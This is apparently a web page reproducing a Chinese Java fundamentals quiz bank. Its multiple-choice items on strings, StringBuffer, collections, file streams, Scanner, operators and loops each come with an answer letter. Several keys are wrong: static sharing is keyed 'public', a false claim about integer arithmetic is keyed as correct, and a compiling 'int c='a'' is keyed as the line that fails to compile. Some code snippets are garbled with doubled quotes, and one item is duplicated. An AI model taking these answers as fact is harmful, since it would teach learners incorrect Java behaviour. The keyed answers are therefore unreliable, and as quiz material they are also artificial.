<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">String str1 <span class="operator">=</span> <span class="string">&quot;sdut@sdut.edu.cn&quot;</span><span class="comment">;</span></span><br><span class="line">String str2 <span class="operator">=</span> str1.toLowerCase()<span class="comment">;</span></span><br><span class="line">System.out.println(str2)<span class="comment">;</span></span><br><span class="line">System.out.println(str1)<span class="comment">;</span></span><br><span class="line">System.out.println(str1 <span class="operator">=</span><span class="operator">=</span> str2)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sdut@sdut<span class="selector-class">.edu</span><span class="selector-class">.cn</span></span><br><span class="line">sdut@sdut<span class="selector-class">.edu</span><span class="selector-class">.cn</span></span><br><span class="line">true</span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sdut@sdut<span class="selector-class">.edu</span><span class="selector-class">.cn</span></span><br><span class="line">sdut@sdut<span class="selector-class">.edu</span><span class="selector-class">.cn</span></span><br><span class="line">false</span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sdut@sdut<span class="selector-class">.edu</span><span class="selector-class">.cn</span></span><br><span class="line">SDUT@SDUT<span class="selector-class">.EDU</span><span class="selector-class">.CN</span></span><br><span class="line">true</span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sdut@sdut<span class="selector-class">.edu</span><span class="selector-class">.cn</span></span><br><span class="line">SDUT@SDUT<span class="selector-class">.EDU</span><span class="selector-class">.CN</span></span><br><span class="line">false</span><br></pre></td></tr></table></figure>
</li>
<li><p>关于字符串的方法，如下代码执行结果是（ ）。B</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">String str1 <span class="operator">=</span> <span class="string">&quot;abcd&quot;</span><span class="comment">; </span></span><br><span class="line">String str2<span class="operator">=</span><span class="string">&quot;sdut&quot;</span><span class="comment">;</span></span><br><span class="line">System.out.println(str1.compareTo(str2)&gt;<span class="number">0</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>A.true</p>
<p>B.false</p>
<p>C.1</p>
<p>D.-1</p>
</li>
<li><p>关于字符串的方法，如下代码执行结果是（ ）。A</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">String str1 <span class="operator">=</span> <span class="string">&quot;sdut12&quot;</span><span class="comment">; </span></span><br><span class="line">String str2<span class="operator">=</span><span class="string">&quot;sDut12&quot;</span><span class="comment">;</span></span><br><span class="line">System.out.println(str1.equalsIgnoreCase(str2))<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>A.true</p>
<p>B.false</p>
<p>C.0</p>
<p>D.1</p>
</li>
<li><p>String类的equals方法，其作用是：（ ）D</p>
<p>A.比较2个字符串对象是否为同一个对象</p>
<p>B.比较2个字符串对象的字符长度是否相同</p>
<p>C.比较2个字符串对象的首地址是否相同</p>
<p>D.比较2个字符串对象的字符序列是否相同</p>
</li>
<li><p>关于字符串的方法，如下代码执行结果是（ ）。A</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">String str <span class="operator">=</span> <span class="string">&quot;    abcd123&quot;</span><span class="comment">;</span></span><br><span class="line">  str.toUpperCase()<span class="comment">;</span></span><br><span class="line">  str.trim()<span class="comment">;</span></span><br><span class="line">  System.out.println(str)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">abcd123</span><br></pre></td></tr></table></figure>

<p>B.</p>
<p>abcd123</p>
<p>C.</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">ABCD123</span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">ABCD123</span><br></pre></td></tr></table></figure>
</li>
<li><p>关于字符串的相关操作，如下代码执行后输出的结果是：（ ）。A</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">String str1<span class="operator">=</span><span class="string">&quot;abc&quot;</span><span class="comment">;</span></span><br><span class="line">String str2<span class="operator">=</span>str1.toUpperCase()<span class="comment">;</span></span><br><span class="line">String str3<span class="operator">=</span>str1.toLowerCase()<span class="comment">;</span></span><br><span class="line">System.out.println(str1<span class="operator">=</span><span class="operator">=</span>str2)<span class="comment">;</span></span><br><span class="line"> System.out.println(str1<span class="operator">=</span><span class="operator">=</span>str3)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>下列关于字符串对象的叙述中，<strong>错误</strong>的是（ ）。B</p>
<p>A.字符串常量是对象</p>
<p>B.String 对象存储字符串的效率比 StringBuilder 高</p>
<p>C.字符串对象具有不变性</p>
<p>D.String类提供了许多用来操作字符串的方法：连接、提取、查询等，一旦返回的结果与原字符串不同，就生成一个新对象，而不是在原字符串进行修改</p>
</li>
<li><p>已知: <code>String s=&quot;abcdedcba”; </code>则<code> s.substring(3,4)</code> 返回的字符串是哪个?（ ）C</p>
<p>A.cd</p>
<p>B.de</p>
<p>C.d</p>
<p>D.dedc</p>
</li>
<li><p>关于字符串对象的比较，&#x3D;&#x3D;用于比较字符串对象的（ ）是否相同；equals()方法用于比较字符串对象的（ ）是否相同。A</p>
<p>A.存储地址 字符序列</p>
<p>B.存储地址 存储地址</p>
<p>C.字符序列 存储地址</p>
<p>D.字符序列 字符序列</p>
</li>
<li><p>执行如下两行代码之后，则内存中存在几个字符串对象?（ ）C</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span> <span class="built_in">str</span>=<span class="string">&quot;abc&quot;</span>; </span><br><span class="line"><span class="built_in">str</span>+=<span class="string">&quot;def&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>A.1</p>
<p>B.2</p>
<p>C.3</p>
<p>D.4</p>
</li>
<li><p>关于对StringBuffer类对象的操作，下面代码执行后，输出结果是（ ）。A</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">StringBuffer buffer<span class="operator">=</span>new StringBuffer()<span class="comment">;</span></span><br><span class="line">StringBuffer buffer2<span class="operator">=</span>buffer.append(<span class="string">&quot;abc&quot;</span>).append(<span class="string">&quot;123&quot;</span>)<span class="comment">;</span></span><br><span class="line">System.out.println(buffer<span class="operator">=</span><span class="operator">=</span>buffer2)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>A.true</p>
<p>B.false</p>
<p>C.0</p>
<p>D.1</p>
</li>
<li><p>StringBuffer类对象与String类对象相比，它的优势在于其可以在原来对象基础上进行字符的更改，但它在（ ）方面不如String类提供的功能丰富。D</p>
<p>A.插入、追加</p>
<p>B.删除</p>
<p>C.修改</p>
<p>D.查询、检索</p>
</li>
<li><p>StringBuffer类维护字符的容量和长度的概念。有该类的对象buf1，其容量与长度的关系是：（ ）。A</p>
<p>A.buf1.capacity()&gt;&#x3D;buf1.length()</p>
<p>B.buf1.capacity()&lt;&#x3D;buf1.length()</p>
<p>C.buf1.size()&gt;buf1.&#x3D;length()</p>
<p>D.buf1.size()&lt;buf1.&#x3D;length()</p>
</li>
<li><p>关于StringBuffer对象的操作，有如下程序代码，程序运行的结果是（ ）。B</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">StringBuffer <span class="attribute">buf1</span>=new StringBuffer(<span class="string">&quot;abcd&quot;</span>);</span><br><span class="line">StringBuffer <span class="attribute">buf2</span>=buf1.append(&quot;def&quot;);</span><br><span class="line">System.out.<span class="built_in">print</span>(buf1+<span class="string">&quot; &quot;</span>);</span><br><span class="line">System.out.<span class="built_in">print</span>(buf2+<span class="string">&quot; &quot;</span>); </span><br><span class="line">System.out.println(<span class="attribute">buf1</span>==buf2);</span><br></pre></td></tr></table></figure>

<p>A.abcd abcddef false</p>
<p>B.abcddef abcddef true</p>
<p>C.abcd abcddef true</p>
<p>D.abcddef abcddef false</p>
</li>
<li><p>有如下程序代码，程序运行的结果是（ ）。A</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">StringBuffer buf=<span class="built_in">new</span> StringBuffer(&quot;Beijing2008&quot;);</span><br><span class="line">buf.<span class="keyword">insert</span>(<span class="number">7</span>, &quot;@&quot;);</span><br><span class="line"><span class="keyword">System</span>.<span class="keyword">out</span>.println(buf);</span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Beijing@</span><span class="number">2008</span></span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Beijing2008@</span></span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Beijing</span>2008</span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">Beijing<span class="meta">#2008</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>关于对StringBuffer对象的操作，有如下程序代码，程序运行的结果是（ ）。B</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">StringBuffer buf<span class="operator">=</span>new StringBuffer(<span class="string">&quot;abcde&quot;</span>)<span class="comment">;</span></span><br><span class="line">buf.reverse()<span class="comment">;</span></span><br><span class="line">System.out.println(buf)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>A.abcde</p>
<p>B.edcba</p>
<p>C.abcd</p>
<p>D.edcb</p>
</li>
<li><p>阅读下面的程序段，以下表达式的值为true的是哪个?（ ）B</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span> str1=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;java&quot;</span>);</span><br><span class="line"><span class="built_in">String</span> str2=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;java&quot;</span>);</span><br><span class="line"><span class="built_in">StringBuffer</span> str3=<span class="keyword">new</span> <span class="built_in">StringBuffer</span>(<span class="string">&quot;java&quot;</span>);</span><br><span class="line"><span class="built_in">StringBuffer</span> str4=<span class="keyword">new</span> <span class="built_in">StringBuffer</span>(<span class="string">&quot;java&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>A.str1&#x3D;&#x3D;str2</p>
<p>B.str1.equals(str2)</p>
<p>C.str3&#x3D;&#x3D;str4</p>
<p>D.str3.equals(str4)</p>
<p>E.str1&#x3D;&#x3D;str3</p>
<p>F.str1.equals(str4)</p>
</li>
<li><p>Java中对日期数据按照国家和地区的使用习惯进行格式化字符串及日期格式转换，要使用到java.text.SimpleDateFormat类。C</p>
<p>把日期转换成符合格式的字符串，调用（ ）方法；把某格式的字符串转换成日期对象，调用（ ）方法。</p>
<p>A.parse format</p>
<p>B.parse dateFormat</p>
<p>C.format parse</p>
<p>D.format parseDate</p>
</li>
<li><p>利用java.util.Date类创建对象，欲得到系统当前时间的语句为：（ ）。A</p>
<p>A.new Date();</p>
<p>B.new Date(0);</p>
<p>C.new Date(NOW);</p>
<p>D.new Date(-1);</p>
</li>
<li><p>关于基本类型的数据与其封装类对象之间的转换，下面说法<strong>错误</strong>的是( )。C</p>
<p>A.Integer类型的对象可以通过拆箱，可以自动转化为int基本类型的数值。</p>
<p>B.int类型的数据通过装箱操作，可以自动转换成Integer类型的对象。</p>
<p>C.int类型的数值通过装箱操作，可以自动封装为Long 类型对象</p>
<p>D.long类型的数据通过装箱操作，可以自动封装为Long类型对象</p>
</li>
<li><p>下列程序代码运行结果是：（ ）。C</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line">    <span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        list.add(<span class="keyword">new</span> <span class="title class_">Test</span>());</span><br><span class="line">        list.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;&quot;</span>ABC<span class="string">&quot;&quot;</span>));</span><br><span class="line">        list.add(<span class="keyword">new</span> <span class="title class_">Test</span>());</span><br><span class="line">        System.out.println(list.size());</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>A.1</p>
<p>B.2</p>
<p>C.3</p>
<p>D.4</p>
</li>
<li><p>返回Collection 中的元素数量的方法是（ ）。C</p>
<p>A.length()</p>
<p>B.capacity()</p>
<p>C.size()</p>
<p>D.count()</p>
</li>
<li><p>Java的集合框架中重要的接口java.util.Collection定义了许多方法。选项中哪个方法不是Collection接口所定义的？( )C</p>
<p>A.int size()</p>
<p>B.boolean containsAll(Collection c)</p>
<p>C.compareTo(Object obj)</p>
<p>D.boolean remove(Object obj)</p>
</li>
<li><p>向Collection中增加数据的方法是（ ）。B</p>
<p>A.insert</p>
<p>B.add</p>
<p>C.append</p>
<p>D.concat</p>
</li>
<li><p>欲构造ArrayList类的一个实例，此类实现了List接口，下列哪个写法是正确的 ？B</p>
<p>A.ArrayList myList&#x3D;new Object()；</p>
<p>B.List myList&#x3D;new ArrayList()；</p>
<p>C.ArrayList myList&#x3D;new List()；</p>
<p>D.List myList&#x3D;new List();</p>
</li>
<li><p>字符串“山东理工”使用UTF-8编码格式得到字节数组bytes，下面哪条语句能够还原为原字符串信息?B</p>
<p>A.new String(bytes)</p>
<p>B.new String(bytes, “UTF-8”)</p>
<p>C.new String(bytes, “GBK”)</p>
<p>D.bytes.toString()</p>
</li>
<li><p>File类中以字符串形式返回文件绝对路径的方法是哪一项？（ ）C</p>
<p>A.getParent()</p>
<p>B.getName()</p>
<p>C.getAbsolutePath()</p>
<p>D.getPath()</p>
</li>
<li><p>想得到文件（目录）的名称，如：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">File</span> file1=<span class="keyword">new</span> <span class="keyword">File</span>(<span class="string">&quot;&quot;</span>F:\\abc\\<span class="string">&quot;&quot;</span>);     <span class="comment">//--&gt; abc</span></span><br><span class="line"><span class="keyword">File</span> file2=<span class="keyword">new</span> <span class="keyword">File</span>(<span class="string">&quot;&quot;</span>F:\\abc.txt<span class="string">&quot;&quot;</span>);   <span class="comment">//--&gt; abc.txt</span></span><br></pre></td></tr></table></figure>

<p>需要使用java.io.File类的对象调用（ ）方法。B</p>
<p>A.toString()</p>
<p>B.getName()</p>
<p>C.getAbsolutePath()</p>
<p>D.getParent()</p>
</li>
<li><p>要从“file.dat”文件中读出第10个字节到变量c中，下列哪个方法适合? （ ）C</p>
<p>A.</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">FileInputStream in<span class="operator">=</span>new FileInputStream(<span class="string">&quot;file.dat&quot;</span>)<span class="comment">; </span></span><br><span class="line">int c<span class="operator">=</span>in.read()<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">RandomAccessFile in<span class="operator">=</span>new RandomAccessFile(<span class="string">&quot;file.dat&quot;</span>)<span class="comment">; </span></span><br><span class="line">in.skip(<span class="number">9</span>)<span class="comment">; </span></span><br><span class="line">int c<span class="operator">=</span>in.readByte()<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">FileInputStream in<span class="operator">=</span>new FileInputStream(<span class="string">&quot;file.dat&quot;</span>)<span class="comment">; </span></span><br><span class="line">in.skip(<span class="number">9</span>)<span class="comment">; </span></span><br><span class="line">int c<span class="operator">=</span>in.read()<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">FileInputStream in<span class="operator">=</span>new FileInputStream(<span class="string">&quot;file.dat&quot;</span>)<span class="comment">; </span></span><br><span class="line">in.skip(<span class="number">10</span>)<span class="comment">; </span></span><br><span class="line">int c<span class="operator">=</span>in.read()<span class="comment">;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在编写Java程序时，若需要使用到标准输入输出流的若干个类，导入包时宜在程序的开头写上（ ）语句。C</p>
<p>A.import java.awt.* ;</p>
<p>B.import java.applet.Applet;</p>
<p>C.import java.io.*;</p>
<p>D.import java.awt.Graphics;</p>
</li>
<li><p>在输入流的read方法返回哪个值，表示读取结束？C</p>
<p>A.0</p>
<p>B.1</p>
<p>C.-1</p>
<p>D.null</p>
</li>
<li><p>利用FileInputStream和FileOutputStream读写文件，哪个方法不抛出IOException?( )A</p>
<p>A.两个类的构造方法</p>
<p>B.read</p>
<p>C.write</p>
<p>D.close</p>
</li>
<li><p>desc tablename; 命令的作用是：C</p>
<p>A.连接数据库</p>
<p>B.创建数据库</p>
<p>C.查看表结构的详细信息</p>
<p>D.删除数据库</p>
</li>
<li><p>关于Java，以下描述错误的是：A</p>
<p>A.Java编译成字节代码，字节代码可以在任何操作系统下直接运行。</p>
<p>B.java的源代码后缀名是 java，编译后的字节代码后知名是 class。</p>
<p>C.使用 Javac 对源代码进行编译，java是虚拟机。</p>
<p>D..class 文件需要在java虚拟机上运行。</p>
</li>
<li><p>关于Java文件的描述，错误的是：D</p>
<p>A.Java文件中定义的类名和文件名保持一致。</p>
<p>B.一个Java文件中可以定义多个class。</p>
<p>C.一个Java文件中只能定义一个public class</p>
<p>D.main函数不一定定义成static</p>
</li>
<li><p>Java编程中，常见的错误类型不包括：A</p>
<p>A.System Errors</p>
<p>B.Syntax Errors</p>
<p>C.Runtime Errors</p>
<p>D.Logic Errors</p>
</li>
<li><p>关于Java代码，描述错误的是B</p>
<p>A.在Eclipse中，所有的Java源文件应该都保存在src这个目录中。</p>
<p>B.package edu.cuit.screen; 这个包申明表示该Java源文件的目录对应：edu&#x2F;cuit.screen.java</p>
<p>C.public static void main(String[] args)<br>{<br>…<br>}</p>
<p>作为一个程序的主函数入口，String[] args这个参数不能省略。</p>
<p>D.主函数的申明是固定的，如：<br>public static void main(String[] args)<br>且返回值一定是void</p>
</li>
<li><p>关于Scanner,错误的描述是：C</p>
<p>A.Scanner 在使用前必须使用new 创建一个实体，且赋值给一个Scanner类型的变量，如下：<br>Scanner input &#x3D; new Scanner(System.in);</p>
<p>B.Scanner 可以读取整数、double、浮点、字符串、字符等基本数据类型。</p>
<p>C.每次读取一个数据必须新建立一个Scanner对象，如下述代码。<br>Scanner input1 &#x3D; new Scanner(System.in);<br>int v1 &#x3D; input1.nextInt();<br>Scanner input2 &#x3D; new Scanner(System.in);<br>int v2 &#x3D; input2.nextInt();</p>
<p>D.Scanner可以从不同的输入源读取数据，不单是控制台。</p>
</li>
<li><p>关于Scanner,错误的描述是：C</p>
<p>A.Scanner 在使用前必须使用new 创建一个实体，且赋值给一个Scanner类型的变量，如下：<br>Scanner input &#x3D; new Scanner(System.in);</p>
<p>B.Scanner 可以读取整数、double、浮点、字符串、字符等基本数据类型。</p>
<p>C.每次读取一个数据必须新建立一个Scanner对象，如下述代码。<br>Scanner input1 &#x3D; new Scanner(System.in);<br>int v1 &#x3D; input1.nextInt();<br>Scanner input2 &#x3D; new Scanner(System.in);<br>int v2 &#x3D; input2.nextInt();</p>
<p>D.Scanner可以从不同的输入源读取数据，不单是控制台。</p>
</li>
<li><p>Java属于以下哪种语言（ ）C</p>
<p>A.机器语言</p>
<p>B.汇编语言</p>
<p>C.高级语言</p>
<p>D.以上都不对</p>
</li>
<li><p>下列选项中，哪一个是多行注释符号（）D</p>
<p>A.&#x2F;&#x2F;**&#x2F;&#x2F;</p>
<p>B.&#x2F;*&#x2F;*</p>
<p>C.&#x2F;&#x2F;</p>
<p>D.&#x2F;**&#x2F;</p>
</li>
<li><p>下列关于变量作用域的说法中，正确的是（）C</p>
<p>A.在main()方法中任何位置定义的变量，其作用域为整个main()方法。</p>
<p>B.代码块中定义的变量，在代码块外也是可以使用的。</p>
<p>C.变量的作用域为：从定义处开始，到变量所在代码块结束的位置。</p>
<p>D.变量的作用域不受代码块的限制。</p>
</li>
<li><p>以下标识符中，不合法的是（ ）C</p>
<p>A.use</p>
<p>B.$inner</p>
<p>C.class</p>
<p>D.login_1</p>
</li>
<li><p>下列选项中，不属于Java中关键字的是（）C</p>
<p>A.if</p>
<p>B.float</p>
<p>C.Final</p>
<p>D.try</p>
</li>
<li><p>下列选项中，属于布尔常量的是（）C</p>
<p>A.198</p>
<p>B.2e3f</p>
<p>C.true</p>
<p>D.null</p>
</li>
<li><p>以下关于变量的定义，正确的是 （ ）A</p>
<p>A.int a&#x3D;10;</p>
<p>B.</p>
<p>b&#x3D;2；</p>
<p>C.int &#x3D;20；</p>
<p>D.int a；b&#x3D;a+10；</p>
</li>
<li><p>下列选项中，哪一个不能通过编译（ ）C</p>
<p>A.byte a&#x3D;1;</p>
<p>B.short b&#x3D;100;</p>
<p>C.int c&#x3D;’a’;</p>
<p>D.long d&#x3D;8888888888888888;</p>
</li>
<li><p>下列浮点数的定义中，正确的是（ ）A</p>
<p>A.</p>
<p>float f &#x3D; 1F;</p>
<p>B.</p>
<p>float f &#x3D; 1.0;</p>
<p>C.</p>
<p>float f &#x3D; ‘1’;</p>
<p>D.</p>
<p>float f &#x3D; “1”;</p>
</li>
<li><p>关于变量类型转换的描述中，正确的是（）D</p>
<p>A.只有数据类型相同的数据才能进行运算。</p>
<p>B.byte类型和short类型的数据是不能一起运算的。</p>
<p>C.两个byte类型数据一起运算时会把先自动提升到int类型再运算。</p>
<p>D.两个整型在一起运算时，结果一定是int。</p>
</li>
<li><p>若int a &#x3D; 7;a %&#x3D; 2;则执行后，变量a的值是（）B</p>
<p>A.7</p>
<p>B.1</p>
<p>C.2</p>
<p>D.3</p>
</li>
<li><p>下列选项中，不属于赋值运算符的是（ ）C</p>
<p>A.-&#x3D;</p>
<p>B.&#x3D;</p>
<p>C.&#x3D;&#x3D;</p>
<p>D.*&#x3D;</p>
</li>
<li><p>下列选项中，不属于比较运算符的是（ ）A</p>
<p>A.&#x3D;</p>
<p>B.&#x3D;&#x3D;</p>
<p>C.&lt;</p>
<p>D.&lt;&#x3D;</p>
</li>
<li><p>下列关于条件语句的描述中，错误的是（ ）C</p>
<p>A.if语句中的条件表达式是一个布尔值。</p>
<p>B.选择语句分为if条件语句和switch条件语句。</p>
<p>C.switch语句中的表达式只能是布尔类型的值。</p>
<p>D.switch语句只能针对某个表达式的值作出判断。</p>
</li>
<li><p>请阅读下面的程序</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SwitchDemo3</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">char</span> c = ‘B’;</span><br><span class="line">        <span class="keyword">switch</span>(c) &#123;</span><br><span class="line">            <span class="keyword">case</span> ‘A’:System.<span class="keyword">out</span>.println(“优”);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ‘B’:System.<span class="keyword">out</span>.println(“良”);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ‘C’:System.<span class="keyword">out</span>.println(“差”);<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下列选项中，哪一个才是程序的运行结果（ ）B</p>
<p>A.优</p>
<p>B.良</p>
<p>C.差</p>
<p>D.编译失败</p>
</li>
<li><p>while语句的循环体中不能包含的语句是（ ）B</p>
<p>A.while语句</p>
<p>B.方法定义语句</p>
<p>C.if语句</p>
<p>D.switch语句</p>
</li>
<li><p>请阅读下面的程序</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span>  &#123;                                                            </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">String</span>[] args)</span> </span>&#123;                                  </span><br><span class="line">        <span class="type">int</span> x = <span class="number">1</span>;                                                                            </span><br><span class="line">        <span class="keyword">do</span> &#123;                                                                                   </span><br><span class="line">            x++;                                                                        </span><br><span class="line">        &#125; <span class="keyword">while</span> (x &lt;= <span class="number">4</span>);      </span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">&quot;x = &quot;</span> + x);                                      </span><br><span class="line">    &#125;                                                                                   </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>程序的运行结果是（）C</p>
<p>A.3</p>
<p>B.4</p>
<p>C.5</p>
<p>D.6</p>
</li>
<li><p>请阅读下面的程序</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">String</span>[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> x =<span class="number">0</span>;x&lt;<span class="number">5</span>;x++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(x%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            System.out.<span class="built_in">println</span>(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果正确的是（）D</p>
<p>A.12345</p>
<p>B.024</p>
<p>C.13</p>
<p>D.不输出任何内容</p>
</li>
<li><p>int[] a&#x3D;{45,4,67,23,65,87,34,52,56}；数组中a[4]的值为（ ）C</p>
<p>A.23</p>
<p>B.45</p>
<p>C.65</p>
<p>D.87</p>
</li>
<li><p>请阅读下列示意代码</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = a++;</span><br><span class="line"><span class="type">int</span> c = ++a;</span><br><span class="line"><span class="type">int</span> d = ++a + ++a;</span><br><span class="line"><span class="keyword">System</span>.<span class="keyword">out</span>.print(a + &quot;,&quot; + b + &quot;,&quot; + c + &quot;,&quot; + d); </span><br></pre></td></tr></table></figure>

<p>下面选项中，哪一个是程序的输出结果（）A</p>
<p>A.5,1,3,9</p>
<p>B.5,2,3,9</p>
<p>C.5,1,2,9</p>
<p>D.5,1,3,8</p>
</li>
<li><p>执行完以下代码int[ ] x &#x3D; new int[25]；后，以下哪项说明是正确的（ ）。A</p>
<p>A.x[24]为0</p>
<p>B.x[25]为0</p>
<p>C.x[0]为空</p>
<p>D.x[24]未定义</p>
</li>
<li><p>以下有关构造方法的说法，正确的是： ____。A</p>
<p>A.一个类的构造方法可以有多个</p>
<p>B.构造方法在类定义时被调用</p>
<p>C.构造方法只能由对象的其它方法调用</p>
<p>D.构造方法可以和类同名，也可以和类名不同</p>
</li>
<li><p>以下关于继承的叙述正确的是（ ）。A</p>
<p>A.在Java中类只允许单一继承</p>
<p>B.在Java中,一个类只能实现一个接口</p>
<p>C.在Java中，一个类不能同时继承一个类和实现一个接口</p>
<p>D.在Java中，接口也具有单继承性</p>
</li>
<li><p>Java源代码文件的扩展名为（ ）C</p>
<p>A..txt</p>
<p>B..class</p>
<p>C..java</p>
<p>D..doc</p>
</li>
<li><p>在控制台显示消息的语句正确的是（ ）C</p>
<p>A.System.out.println(我是一个Java程序员了！);</p>
<p>B.System.Out.println(“我是一个Java程序员了！”);</p>
<p>C.System.out.println(“我是一个Java程序员了！”);</p>
<p>D.System.Out.Println(“我是一个Java程序员了！”)</p>
</li>
<li><p>下面选项中不是开发Java程序的步骤（ ）D</p>
<p>A.编译</p>
<p>B.编写源代码</p>
<p>C.运行</p>
<p>D.发布</p>
</li>
<li><p>如果希望某些属性被所有对象共享，就必须将其声明为（）属性。B</p>
<p>A.final</p>
<p>B.public</p>
<p>C.static</p>
<p>D.this</p>
</li>
<li><p>以下表达式中，（）不可作为循环条件。A</p>
<p>A.x &#x3D; 10</p>
<p>B.y &gt;&#x3D; 80</p>
<p>C.inputPass &#x3D;&#x3D; truePass</p>
<p>D.m !&#x3D;3</p>
</li>
<li><p>下列变量定义中，符合Java命名规范的是（）C</p>
<p>A.3a</p>
<p>B.int-name</p>
<p>C.$number</p>
<p>D.field name</p>
</li>
<li><p>字节码文件经过Java编译器翻译成一种特殊的二进制文件，由JVM负责解释执行。该二进制文件扩展名为（）B</p>
<p>A..java</p>
<p>B..class</p>
<p>C..obj</p>
<p>D.bin</p>
</li>
